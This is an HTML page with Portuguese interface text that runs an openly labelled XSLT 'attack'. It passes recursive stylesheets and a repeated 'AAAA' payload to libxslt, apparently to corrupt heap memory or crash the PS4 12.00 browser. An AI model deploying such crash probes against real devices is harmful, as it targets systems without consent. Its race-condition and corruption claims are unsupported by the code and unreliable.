<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 XSLT Heap Corrupter</title>
</head>
<body>
    <h1>XSLT Memory Corruption Test</h1>
    <p>Target: libxslt/libxml2 internal bindings.</p>
    
    <button onclick="startXSLTAttack()">INICIAR ATAQUE XSLT</button>
    <div id="status" class="log">Aguardando comando...</div>

    <script>
        function log(msg) { document.getElementById('status').innerText = msg; }

        function startXSLTAttack() {
            log("Gerando payload XML/XSLT malicioso...");

            if (!window.XSLTProcessor) {
                log("ERRO: XSLTProcessor não existe neste navegador (Mitigado?).");
                return;
            }

            setTimeout(() => {
                try {
                    // 1. Criar um XML base simples
                    const parser = new DOMParser();
                    const xmlString = `<root>${"<node>data</node>".repeat(100)}</root>`;
                    const xmlDoc = parser.parseFromString(xmlString, "text/xml");

                    // 2. Criar um XSLT "Maligno" (Recursão + Geração de Atributos Dinâmicos)
                    // Isso tenta estressar o alocador de memória do libxml2
                    const xslString = `
                    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                        <xsl:template match="/">
                            <output>
                                <xsl:apply-templates select="//node"/>
                            </output>
                        </xsl:template>

                        <xsl:template match="node">
                            <xsl:element name="bomb">
                                <xsl:attribute name="id">
                                    <xsl:value-of select="concat('id_', position())"/>
                                </xsl:attribute>
                                <xsl:call-template name="stress">
                                    <xsl:with-param name="depth" select="30"/>
                                </xsl:call-template>
                            </xsl:element>
                        </xsl:template>

                        <xsl:template name="stress">
                            <xsl:param name="depth"/>
                            <xsl:if test="$depth > 0">
                                <xsl:variable name="payload" select="'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"/>
                                <data><xsl:value-of select="$payload"/></data>
                                <xsl:call-template name="stress">
                                    <xsl:with-param name="depth" select="$depth - 1"/>
                                </xsl:call-template>
                            </xsl:if>
                        </xsl:template>
                    </xsl:stylesheet>`;

                    const xslDoc = parser.parseFromString(xslString, "text/xml");

                    // 3. O Gatilho
                    log("Executando transformToFragment (Isso deve travar o WebProcess)...");
                    
                    const processor = new XSLTProcessor();
                    processor.importStylesheet(xslDoc);
                    
                    // Loop rápido para tentar Race Condition no processador
                    for(let i=0; i<50; i++) {
                        const fragment = processor.transformToFragment(xmlDoc, document);
                        // Tenta acessar o fragmento imediatamente
                        document.body.appendChild(fragment);
                    }

                    log("Sobreviveu. O libxslt parece estável.");
                    
                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 500);
        }
    </script>
</body>
</html>

